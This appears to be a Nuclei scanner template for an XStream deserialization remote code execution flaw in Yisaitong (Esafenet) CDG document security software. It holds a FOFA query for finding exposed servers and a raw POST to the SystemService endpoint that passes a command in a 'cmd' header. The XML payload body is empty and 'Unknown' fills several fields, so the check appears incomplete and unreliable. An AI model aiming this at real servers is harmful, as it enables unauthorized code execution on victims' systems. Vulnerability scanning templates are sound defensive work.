id: yisaitong-XStream-rce

info:
  name: 亿赛通电子文档安全管理系统 XStream 反序列化远程代码执行漏洞
  author: Unknown
  severity: high
  description: |-
    fofa: body="CDGServer3"
      漏洞源于系统集成的XStream库版本存在反序列化机制缺陷。攻击者通过构造特制XML格式的反序列化载荷，可绕过XStream黑名单校验策略，触发非预期的反序列化操作，最终实现任意代码执行并完全控制目标服务器。该漏洞利用链涉及XStream库版本特性，需结合具体环境参数进行有效载荷适配。
  reference:
  - https://mp.weixin.qq.com/s/q9ukDQl8eT4mHRw_v7NfGA?token=1015546094&lang=zh_CN
  tags: 亿赛通


http:
- raw:
  - |
    POST /CDGServer3/SystemService?command=GETSYSTEMINFO HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Content-Type: text/xml
    cmd: echo Unknown

    
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'Unknown'
  - type: status
    status:
    - 200
